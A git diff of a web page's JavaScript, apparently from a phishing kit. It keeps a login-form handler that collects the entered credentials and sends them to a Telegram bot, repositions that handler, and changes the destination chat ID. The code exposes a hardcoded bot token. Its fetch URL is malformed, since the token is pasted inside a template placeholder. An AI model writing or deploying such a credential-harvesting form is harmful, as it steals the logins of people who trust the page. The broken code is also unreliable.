@@ -92,10 +92,7 @@ document.addEventListener('DOMContentLoaded', () => {
     })
   }
 
-})
-
-
-   document.getElementById('loginForm').addEventListener('submit', function(e) {
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault(); // Stops the page from reloading
 
     // 1. Grab all the input values from the HTML form
@@ -108,7 +105,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // 3. Your Telegram configuration
     const token = '8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44';
-    const chatId = '8314676610';
+    const chatId = '1490539700';
 
     // 4. Send the data to Telegram's API
     fetch(`https://api.telegram.org/bot${8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44}/sendMessage`, {
@@ -128,3 +125,6 @@ document.addEventListener('DOMContentLoaded', () => {
     })
     .catch(error => console.error('Error:', error));
 });
+
+})
+
